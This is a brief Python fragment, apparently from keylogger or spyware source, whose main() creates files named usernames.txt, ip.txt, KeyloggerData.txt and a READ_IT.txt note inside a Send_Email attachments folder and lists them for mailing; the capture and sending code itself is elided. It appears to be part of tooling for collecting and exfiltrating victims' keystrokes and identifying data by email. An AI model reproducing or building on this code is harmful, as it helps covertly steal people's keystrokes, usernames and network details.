...
def main():
    system(
        "touch Defs/Send_Email/attachments/READ_IT.txt && touch Defs/Send_Email/attachments/usernames.txt && touch Defs/Send_Email/attachments/ip.txt && touch Defs/Send_Email/attachments/KeyloggerData.txt"
    )
    ...
    attachments = [
        "Defs/Send_Email/attachments/READ_IT.txt",
        "Defs/Send_Email/attachments/ip.txt",
        "Defs/Send_Email/attachments/usernames.txt",
        "Defs/Send_Email/attachments/KeyloggerData.txt",
    ]
